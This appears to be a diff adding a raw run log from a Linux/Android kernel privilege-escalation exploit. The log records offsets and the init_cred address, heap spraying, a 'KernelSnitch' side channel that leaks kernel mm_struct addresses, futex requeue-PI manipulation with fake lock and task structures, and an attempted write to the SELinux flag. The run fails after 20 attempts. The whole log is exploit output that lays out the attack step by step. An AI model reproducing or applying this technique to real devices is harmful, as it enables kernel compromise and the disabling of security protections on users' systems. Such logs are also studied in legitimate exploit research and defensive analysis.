@@ -1,0 +1,298 @@
+﻿[33m[T+1006.027] [*] [0mknobs: HOLD_CHAIN=1 STAMP_SYNC=1 STAMP_PRE_M4=0 CANARY_SEQ=0 CANARY_RATCHET=0 CANARY_ARM=0 CHAIN_BAIL=0 ROUTE_ATTEMPTS=1 OWNER_HANDOFF=0 PUNCH_IN_WINDOW=1 MCAST_SHIFT=24 M4_TIMEOUT_MS=1000 PROBE_BOOTID=0 STAMP_ECHO=0 ARM_T=0 ARM_T_T2=0 SPRAY_TEST=0
+[33m[T+1006.027] [*] [0mkernel: 5.4.289-qgki-g8f2019ef68d9
+[32m[T+1006.027] [+] [0moffsets matched: 5.4.289-qgki-g8f2019ef68d9
+[33m[T+1006.027] [*] [0minit_cred image=ffffffc012a8f5e0 alias=ffffff80aaa0f5e0
+[33m[T+1006.027] [*] [0mp0 kernel_phys_load=0000000128000000 phys_offset=0000000080000000 delta=00000000a8000000
+[33m[T+1006.028] [*] [0mmemstart probe: disabled
+[33m[T+1006.028] [*] [0mslab_drain: waves=5 batch=400
+[33m[T+1006.028] [*] [0mslab_drain: wave 1/5 start
+[33m[T+1006.224] [*] [0mslab_drain: wave 1/5 forked 400, killing
+[33m[T+1006.447] [*] [0mslab_drain: wave 2/5 start
+[33m[T+1006.642] [*] [0mslab_drain: wave 2/5 forked 400, killing
+[33m[T+1006.867] [*] [0mslab_drain: wave 3/5 start
+[33m[T+1007.062] [*] [0mslab_drain: wave 3/5 forked 400, killing
+[33m[T+1007.288] [*] [0mslab_drain: wave 4/5 start
+[33m[T+1007.483] [*] [0mslab_drain: wave 4/5 forked 400, killing
+[33m[T+1007.720] [*] [0mslab_drain: wave 5/5 start
+[33m[T+1007.918] [*] [0mslab_drain: wave 5/5 forked 400, killing
+[33m[T+1008.185] [*] [0mslab_drain: drain done
+[33m[T+1008.186] [*] [0mWrite 1 attempt 1/2
+[33m[T+1008.186] [*] [0m=== W1: SELinux === target=0xffffffc012c8e001 mode=1
+[33m[T+1008.186] [*] [0m[T+1008186ms]   heap spray start
+[33m[T+1008.779] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1008.780] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1008.781] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1009.769] [*] [0mKS pile timing: target_before=6 target_after=1524 other_after=6 pile=4096
+[33m[T+1032.853] [*] [0mKernelSnitch collisions: seen=31 verified=3 rejected_fp=0 post_min=5
+[33m[T+1032.854] [*] [0mKS accepted[1]=idx=4107
+[33m[T+1032.854] [*] [0mKS accepted[2]=idx=5263
+[33m[T+1032.854] [*] [0mKS accepted[3]=idx=7414
+[33m[T+1032.854] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1032.854] [*] [0mKS addr[1]=00000062b9f8b058
+[33m[T+1032.854] [*] [0mKS addr[2]=00000062ba40f478
+[33m[T+1032.854] [*] [0mKS addr[3]=00000062bac767b0
+[33m[T+1032.854] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1032.854] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1032.855] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1033.255] [*] [0mKernelSnitch collisions: found
+[33m[T+1035.099] [*] [0mKS brute: tested=192476186 eq=1 gate_rej=0
+[33m[T+1035.099] [*] [0mKS diag eq[0]=ffffffad67392580
+[33m[T+1035.099] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffad67392580
+[33m[T+1035.099] [*] [0mW1 page gate check: base=0xffffffad67390000 bit15=0 bit24=1 write=1
+[33m[T+1035.861] [*] [0mprepare_kernel_page ok attempt=1
+[33m[T+1035.861] [*] [0m[T+1035862ms]   heap spray done
+[33m[T+1035.862] [*] [0mO0 owner: parked at nice 19 (prio 39)
+[33m[T+1035.862] [*] [0mO1 owner: target-locked
+[33m[T+1035.862] [*] [0mO2 owner: pre-chain-lock
+[33m[T+1035.863] [*] [0mM4 waiter: entering WAIT_REQUEUE_PI (timeout=1000ms)
+[33m[T+1035.914] [*] [0mM5 main: firing CMP_REQUEUE_PI
+[33m[T+1035.914] [*] [0mM6x probe: f_wait=0 f_pi_target=27707 f_pi_chain=2147511354 main=20229 waiter=27706 owner=27707 waiter_prio=20
+[33m[T+1035.914] [*] [0mM6 main: CMP_REQUEUE_PI ret=-1 errno=35
+[33m[T+1035.914] [*] [0mM6i main: firing post-M6 in-window punch seq=100 delay=0usec (m4_timeout=1000ms waiter_prio=20)
+[33m[T+1035.914] [*] [0mconsumer: saw seq=100
+[33m[T+1035.914] [*] [0mC0 consumer: about to punch tid=27706 nice=18
+[33m[T+1035.914] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+1035.914] [*] [0mP1 consumer: waiter prio18 post-punch=38 (39/38=punch-applied 20=NOT-applied)
+[33m[T+1035.915] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+1035.915] [*] [0mM4 waiter: WAIT_REQUEUE_PI ret=-1 errno=11 (SF removed)
+[33m[T+1035.915] [*] [0mM4b waiter: GL_HOLD_CHAIN — deferring chain unlock until after the carrier (owner stays parked in O2)
+[33m[T+1035.915] [*] [0mmcast shift sweep=24 cycle=0
+[33m[T+1035.915] [*] [0mmcast pre-stamp begin attempt=1 payload=0x5715a71a38
+[33m[T+1035.915] [*] [0mmcast pre-stamp done attempt=1 ret=-1 errno=22
+[33m[T+1035.915] [*] [0mmcast route setup attempt=1 page=ffffffad67390000 fake_lock=ffffffad67390000 fake_w0=ffffffad67390300 fake_task=ffffffad67390400 pre_ret=-1 pre_errno=22 delay=0
+[33m[T+1035.915] [*] [0mM6j main: post-M6 in-window punch done=1 waited=1ms
+[33m[T+1035.915] [*] [0mmain: M6 done — waiting for route_done
+[33m[T+1035.915] [*] [0mcanary root=0000000000000000 leftmost=0000000000000000 w0=ffffffad67390300 pi_pc=0000000000000000 self=ffffffad67390318 reads_ok=0 lockerase=0 lockinsert=0 piphase=0
+[33m[T+1035.915] [*] [0msync pre-stamp begin
+[33m[T+1035.915] [*] [0mcprobe setname=0/0 pread=0/0 val=0000000000000000
+[33m[T+1035.915] [*] [0mconsumer: saw seq=1
+[33m[T+1035.916] [*] [0mC0 consumer: about to punch tid=27706 nice=19
+[33m[T+1035.916] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+1035.916] [*] [0mP1 consumer: waiter prio18 post-punch=39 (39/38=punch-applied 20=NOT-applied)
+[33m[T+1035.916] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+1035.916] [*] [0mcanary root=0000000000000000 leftmost=0000000000000000 w0=ffffffad67390300 pi_pc=0000000000000000 self=ffffffad67390318 reads_ok=0 lockerase=0 lockinsert=0 piphase=0
+[33m[T+1035.916] [*] [0msync hold done calls=1 success=2
+[33m[T+1035.916] [*] [0mmcast returned attempt=1 calls=1 success=2 pre_ret=-1 pre_errno=22 delay=0 +1ms
+[33m[T+1035.916] [*] [0mmcast route quality miss attempt=1/1 step=0 errno=0; page kept, re-punching
+[33m[T+1035.917] [*] [0mmcast route done calls=1 success=2 step=0 errno=0
+[33m[T+1035.918] [*] [0mP2 waiter: own prio post-route=39
+[33m[T+1035.918] [*] [0mR1 post-route read fd=5 ret=0 errno=0 val=0000000000000000
+[33m[T+1035.918] [*] [0mM4b waiter: post-carrier chain unlock ret=0 errno=0
+[33m[T+1035.918] [*] [0mO3 owner: chain-locked
+[33m[T+1035.919] [*] [0mP3 waiter: GL_HOLD_WAITER=1 — parking forever to keep pi_blocked_on dangle alive (post-walk exit would walk the ghost on a torn-down stack and panic)
+[33m[T+1035.920] [*] [0m[T+1035921ms]   PI route done
+[33m[T+1036.021] [*] [0mslab_drain: waves=5 batch=400
+[33m[T+1036.021] [*] [0mslab_drain: wave 1/5 start
+[33m[T+1036.265] [*] [0mslab_drain: wave 1/5 forked 400, killing
+[33m[T+1036.558] [*] [0mslab_drain: wave 2/5 start
+[33m[T+1036.803] [*] [0mslab_drain: wave 2/5 forked 400, killing
+[33m[T+1037.097] [*] [0mslab_drain: wave 3/5 start
+[33m[T+1037.338] [*] [0mslab_drain: wave 3/5 forked 400, killing
+[33m[T+1037.632] [*] [0mslab_drain: wave 4/5 start
+[33m[T+1037.875] [*] [0mslab_drain: wave 4/5 forked 400, killing
+[33m[T+1038.213] [*] [0mslab_drain: wave 5/5 start
+[33m[T+1038.456] [*] [0mslab_drain: wave 5/5 forked 400, killing
+[33m[T+1038.793] [*] [0mslab_drain: drain done
+[33m[T+1038.793] [*] [0mWrite 1 attempt 2/2
+[33m[T+1038.793] [*] [0m=== W1: SELinux === target=0xffffffc012c8e001 mode=1
+[33m[T+1038.794] [*] [0m[T+1038794ms]   heap spray start
+[33m[T+1039.492] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1039.493] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1039.494] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1040.612] [*] [0mKS pile timing: target_before=5 target_after=1543 other_after=7 pile=4096
+[33m[T+1066.148] [*] [0mKernelSnitch collisions: seen=40 verified=3 rejected_fp=0 post_min=5
+[33m[T+1066.149] [*] [0mKS accepted[1]=idx=1269
+[33m[T+1066.149] [*] [0mKS accepted[2]=idx=2725
+[33m[T+1066.149] [*] [0mKS accepted[3]=idx=8419
+[33m[T+1066.149] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1066.149] [*] [0mKS addr[1]=00000062b617b7a8
+[33m[T+1066.149] [*] [0mKS addr[2]=00000062b672b528
+[33m[T+1066.149] [*] [0mKS addr[3]=00000062b7d69718
+[33m[T+1066.149] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1066.149] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1066.149] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1066.575] [*] [0mKernelSnitch collisions: found
+[33m[T+1068.455] [*] [0mKS brute: tested=355779679 eq=1 gate_rej=0
+[33m[T+1068.455] [*] [0mKS diag eq[0]=ffffffac902d8b40
+[33m[T+1068.455] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffac902d8b40
+[33m[T+1068.455] [*] [0mW1 page gate check: base=0xffffffac902d8000 bit15=1 bit24=0 write=1
+[31m[T+1068.455] [-] [0mW1 page unsuitable (need bit15=0 bit24=1): base=0xffffffac902d8000
+[31m[T+1069.850] [-] [0mprepare_kernel_page retry 1/24
+[33m[T+1070.090] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1070.091] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1070.091] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1071.159] [*] [0mKS pile timing: target_before=6 target_after=1499 other_after=5 pile=4096
+[33m[T+1094.512] [*] [0mKernelSnitch collisions: seen=35 verified=3 rejected_fp=0 post_min=5
+[33m[T+1094.513] [*] [0mKS accepted[1]=idx=3129
+[33m[T+1094.513] [*] [0mKS accepted[2]=idx=3170
+[33m[T+1094.513] [*] [0mKS accepted[3]=idx=4021
+[33m[T+1094.513] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1094.513] [*] [0mKS addr[1]=00000062b68bf1c8
+[33m[T+1094.513] [*] [0mKS addr[2]=00000062b68e8310
+[33m[T+1094.513] [*] [0mKS addr[3]=00000062b6c3bda8
+[33m[T+1094.513] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1094.513] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1094.513] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1094.922] [*] [0mKernelSnitch collisions: found
+[33m[T+1096.744] [*] [0mKS brute: tested=302601268 eq=1 gate_rej=0
+[33m[T+1096.744] [*] [0mKS diag eq[0]=ffffffac70b15280
+[33m[T+1096.744] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffac70b15280
+[33m[T+1096.744] [*] [0mW1 page gate check: base=0xffffffac70b10000 bit15=0 bit24=0 write=1
+[31m[T+1096.744] [-] [0mW1 page unsuitable (need bit15=0 bit24=1): base=0xffffffac70b10000
+[31m[T+1097.795] [-] [0mprepare_kernel_page retry 2/24
+[33m[T+1098.032] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1098.032] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1098.032] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1099.058] [*] [0mKS pile timing: target_before=6 target_after=1568 other_after=7 pile=4096
+[33m[T+1120.843] [*] [0mKernelSnitch collisions: seen=27 verified=3 rejected_fp=0 post_min=5
+[33m[T+1120.844] [*] [0mKS accepted[1]=idx=2129
+[33m[T+1120.844] [*] [0mKS accepted[2]=idx=2295
+[33m[T+1120.844] [*] [0mKS accepted[3]=idx=2816
+[33m[T+1120.844] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1120.844] [*] [0mKS addr[1]=00000062b64d7288
+[33m[T+1120.844] [*] [0mKS addr[2]=00000062b657d7b8
+[33m[T+1120.845] [*] [0mKS addr[3]=00000062b6786800
+[33m[T+1120.845] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1120.845] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1120.845] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1121.252] [*] [0mKernelSnitch collisions: found
+[33m[T+1122.834] [*] [0mKS brute: tested=264803095 eq=1 gate_rej=0
+[33m[T+1122.834] [*] [0mKS diag eq[0]=ffffffab14b71e00
+[33m[T+1122.834] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffab14b71e00
+[33m[T+1122.834] [*] [0mW1 page gate check: base=0xffffffab14b70000 bit15=0 bit24=0 write=1
+[31m[T+1122.834] [-] [0mW1 page unsuitable (need bit15=0 bit24=1): base=0xffffffab14b70000
+[31m[T+1123.956] [-] [0mprepare_kernel_page retry 3/24
+[33m[T+1124.191] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1124.192] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1124.192] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1125.247] [*] [0mKS pile timing: target_before=6 target_after=1589 other_after=6 pile=4096
+[33m[T+1149.089] [*] [0mKernelSnitch collisions: seen=35 verified=3 rejected_fp=0 post_min=5
+[33m[T+1149.090] [*] [0mKS accepted[1]=idx=4870
+[33m[T+1149.090] [*] [0mKS accepted[2]=idx=5450
+[33m[T+1149.090] [*] [0mKS accepted[3]=idx=7123
+[33m[T+1149.090] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1149.090] [*] [0mKS addr[1]=00000062b6f8c830
+[33m[T+1149.090] [*] [0mKS addr[2]=00000062b71d0a50
+[33m[T+1149.090] [*] [0mKS addr[3]=00000062b7859e98
+[33m[T+1149.090] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1149.090] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1149.090] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1149.493] [*] [0mKernelSnitch collisions: found
+[33m[T+1151.364] [*] [0mKS brute: tested=249425949 eq=1 gate_rej=0
+[33m[T+1151.364] [*] [0mKS diag eq[0]=ffffffad6e3f3fc0
+[33m[T+1151.364] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffad6e3f3fc0
+[33m[T+1151.364] [*] [0mW1 page gate check: base=0xffffffad6e3f0000 bit15=0 bit24=0 write=1
+[31m[T+1151.364] [-] [0mW1 page unsuitable (need bit15=0 bit24=1): base=0xffffffad6e3f0000
+[31m[T+1152.397] [-] [0mprepare_kernel_page retry 4/24
+[33m[T+1152.632] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1152.633] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1152.633] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1153.699] [*] [0mKS pile timing: target_before=6 target_after=1611 other_after=6 pile=4096
+[33m[T+1177.395] [*] [0mKernelSnitch collisions: seen=35 verified=3 rejected_fp=0 post_min=5
+[33m[T+1177.395] [*] [0mKS accepted[1]=idx=3015
+[33m[T+1177.395] [*] [0mKS accepted[2]=idx=5945
+[33m[T+1177.395] [*] [0mKS accepted[3]=idx=7545
+[33m[T+1177.396] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1177.396] [*] [0mKS addr[1]=00000062b684de38
+[33m[T+1177.396] [*] [0mKS addr[2]=00000062b73bf9c8
+[33m[T+1177.396] [*] [0mKS addr[3]=00000062b79ffbc8
+[33m[T+1177.396] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1177.396] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1177.396] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1177.804] [*] [0mKernelSnitch collisions: found
+[33m[T+1179.744] [*] [0mKS brute: tested=252319596 eq=1 gate_rej=0
+[33m[T+1179.744] [*] [0mKS diag eq[0]=ffffffadf1af8b40
+[33m[T+1179.744] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffadf1af8b40
+[33m[T+1179.744] [*] [0mW1 page gate check: base=0xffffffadf1af8000 bit15=1 bit24=1 write=1
+[31m[T+1179.744] [-] [0mW1 page unsuitable (need bit15=0 bit24=1): base=0xffffffadf1af8000
+[31m[T+1180.746] [-] [0mprepare_kernel_page retry 5/24
+[33m[T+1180.983] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1180.984] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1180.984] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1182.006] [*] [0mKS pile timing: target_before=5 target_after=1575 other_after=6 pile=4096
+[33m[T+1204.920] [*] [0mKernelSnitch collisions: seen=32 verified=3 rejected_fp=0 post_min=5
+[33m[T+1204.921] [*] [0mKS accepted[1]=idx=799
+[33m[T+1204.921] [*] [0mKS accepted[2]=idx=5118
+[33m[T+1204.921] [*] [0mKS accepted[3]=idx=5315
+[33m[T+1204.921] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1204.921] [*] [0mKS addr[1]=00000062b5fa58f8
+[33m[T+1204.921] [*] [0mKS addr[2]=00000062b7084ff0
+[33m[T+1204.921] [*] [0mKS addr[3]=00000062b7149618
+[33m[T+1204.921] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1204.922] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1204.922] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1205.318] [*] [0mKernelSnitch collisions: found
+[33m[T+1207.318] [*] [0mKS brute: tested=197840762 eq=0 gate_rej=0
+[33m[T+1207.318] [*] [0mKS diag eq[0]=ffffffad6a61ad00
+[33m[T+1207.318] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffad6a61ad00
+[33m[T+1207.318] [*] [0mW1 page gate check: base=0xffffffad6a618000 bit15=1 bit24=0 write=1
+[31m[T+1207.318] [-] [0mW1 page unsuitable (need bit15=0 bit24=1): base=0xffffffad6a618000
+[31m[T+1208.395] [-] [0mprepare_kernel_page retry 6/24
+[33m[T+1208.632] [*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[T+1208.632] [*] [0mKS hashsize=2048 sysconf=8
+[33m[T+1208.633] [*] [0mKernelSnitch parameters: threads=8 collisions=4 futexes=65536 identity_step=0xfc0000000 mm_stride=0x3c0
+[33m[T+1209.682] [*] [0mKS pile timing: target_before=6 target_after=1556 other_after=6 pile=4096
+[33m[T+1234.915] [*] [0mKernelSnitch collisions: seen=41 verified=3 rejected_fp=0 post_min=5
+[33m[T+1234.915] [*] [0mKS accepted[1]=idx=500
+[33m[T+1234.915] [*] [0mKS accepted[2]=idx=2277
+[33m[T+1234.915] [*] [0mKS accepted[3]=idx=2347
+[33m[T+1234.915] [*] [0mKS addr[0]=000000755c4650c8
+[33m[T+1234.916] [*] [0mKS addr[1]=00000062b5e7afa0
+[33m[T+1234.916] [*] [0mKS addr[2]=00000062b656b728
+[33m[T+1234.916] [*] [0mKS addr[3]=00000062b65b1958
+[33m[T+1234.916] [*] [0mKS pair0-1 model_eq@0=0
+[33m[T+1234.916] [*] [0mKS pair0-2 model_eq@0=0
+[33m[T+1234.916] [*] [0mKS pair0-3 model_eq@0=0
+[33m[T+1235.318] [*] [0mKernelSnitch collisions: found
+[33m[T+1237.182] [*] [0mKS brute: tested=247638490 eq=1 gate_rej=0
+[33m[T+1237.182] [*] [0mKS diag eq[0]=ffffffad35917bc0
+[33m[T+1237.182] [*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffffad35917bc0
+[33m[T+1237.182] [*] [0mW1 page gate check: base=0xffffffad35910000 bit15=0 bit24=1 write=1
+[33m[T+1238.098] [*] [0mprepare_kernel_page ok attempt=7
+[33m[T+1238.098] [*] [0m[T+1238099ms]   heap spray done
+[33m[T+1238.099] [*] [0mO0 owner: parked at nice 19 (prio 39)
+[33m[T+1238.099] [*] [0mO1 owner: target-locked
+[33m[T+1238.099] [*] [0mO2 owner: pre-chain-lock
+[33m[T+1238.100] [*] [0mM4 waiter: entering WAIT_REQUEUE_PI (timeout=1000ms)
+[33m[T+1238.151] [*] [0mM5 main: firing CMP_REQUEUE_PI
+[33m[T+1238.151] [*] [0mM6x probe: f_wait=0 f_pi_target=13895 f_pi_chain=2147497542 main=20229 waiter=13894 owner=13895 waiter_prio=20
+[33m[T+1238.151] [*] [0mM6 main: CMP_REQUEUE_PI ret=-1 errno=35
+[33m[T+1238.151] [*] [0mM6i main: firing post-M6 in-window punch seq=100 delay=0usec (m4_timeout=1000ms waiter_prio=20)
+[33m[T+1238.151] [*] [0mconsumer: saw seq=100
+[33m[T+1238.151] [*] [0mC0 consumer: about to punch tid=13894 nice=18
+[33m[T+1238.152] [*] [0mconsumer: saw seq=100
+[33m[T+1238.152] [*] [0mC0 consumer: about to punch tid=13894 nice=19
+[33m[T+1238.152] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+1238.152] [*] [0mP1 consumer: waiter prio18 post-punch=39 (39/38=punch-applied 20=NOT-applied)
+[33m[T+1238.152] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+1238.152] [*] [0mM4 waiter: WAIT_REQUEUE_PI ret=-1 errno=11 (SF removed)
+[33m[T+1238.152] [*] [0mM4b waiter: GL_HOLD_CHAIN — deferring chain unlock until after the carrier (owner stays parked in O2)
+[33m[T+1238.152] [*] [0mmcast shift sweep=24 cycle=1
+[33m[T+1238.152] [*] [0mmcast pre-stamp begin attempt=1 payload=0x5715a71a38
+[33m[T+1238.153] [*] [0mmcast pre-stamp done attempt=1 ret=-1 errno=22
+[33m[T+1238.153] [*] [0mM6j main: post-M6 in-window punch done=1 waited=1ms
+[33m[T+1238.153] [*] [0mmain: M6 done — waiting for route_done
+[33m[T+1238.153] [*] [0mmcast route setup attempt=1 page=ffffffad35910000 fake_lock=ffffffad35910000 fake_w0=ffffffad35910300 fake_task=ffffffad35910400 pre_ret=-1 pre_errno=22 delay=0
+[33m[T+1238.153] [*] [0msync pre-stamp begin
+[33m[T+1238.152] [*] [0mcanary root=0000000000000000 leftmost=0000000000000000 w0=ffffffad35910300 pi_pc=0000000000000000 self=ffffffad35910318 reads_ok=0 lockerase=0 lockinsert=0 piphase=0
+[33m[T+1238.153] [*] [0mconsumer: saw seq=1
+[33m[T+1238.153] [*] [0mC0 consumer: about to punch tid=13894 nice=18
+[33m[T+1238.154] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+1238.154] [*] [0mP1 consumer: waiter prio18 post-punch=38 (39/38=punch-applied 20=NOT-applied)
+[33m[T+1238.154] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+1238.154] [*] [0mcanary root=0000000000000000 leftmost=0000000000000000 w0=ffffffad35910300 pi_pc=0000000000000000 self=ffffffad35910318 reads_ok=0 lockerase=0 lockinsert=0 piphase=0
+[33m[T+1238.154] [*] [0msync hold done calls=1 success=2
+[33m[T+1238.154] [*] [0mmcast returned attempt=1 calls=1 success=2 pre_ret=-1 pre_errno=22 delay=0 +2ms
+[33m[T+1238.155] [*] [0mmcast route quality miss attempt=1/1 step=0 errno=0; page kept, re-punching
+[33m[T+1238.156] [*] [0mmcast route done calls=1 success=2 step=0 errno=0
+[33m[T+1238.156] [*] [0mP2 waiter: own prio post-route=38
+[33m[T+1238.156] [*] [0mR1 post-route read fd=5 ret=0 errno=0 val=0000000000000000
+[33m[T+1238.156] [*] [0mM4b waiter: post-carrier chain unlock ret=0 errno=0
+[33m[T+1238.156] [*] [0mO3 owner: chain-locked
+[33m[T+1238.157] [*] [0mP3 waiter: GL_HOLD_WAITER=1 — parking forever to keep pi_blocked_on dangle alive (post-walk exit would walk the ghost on a torn-down stack and panic)
+[33m[T+1238.158] [*] [0m[T+1238158ms]   PI route done
+[33m[T+1238.160] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+1238.160] [*] [0mP1 consumer: waiter prio18 post-punch=38 (39/38=punch-applied 20=NOT-applied)
+[33m[T+1238.160] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+1238.160] [*] [0mcanary root=0000000000000000 leftmost=0000000000000000 w0=ffffffad35910300 pi_pc=0000000000000000 self=ffffffad35910318 reads_ok=0 lockerase=0 lockinsert=0 piphase=0
+[31m[T+1238.258] [!] [0mWrite 1 failed after 20 attempts
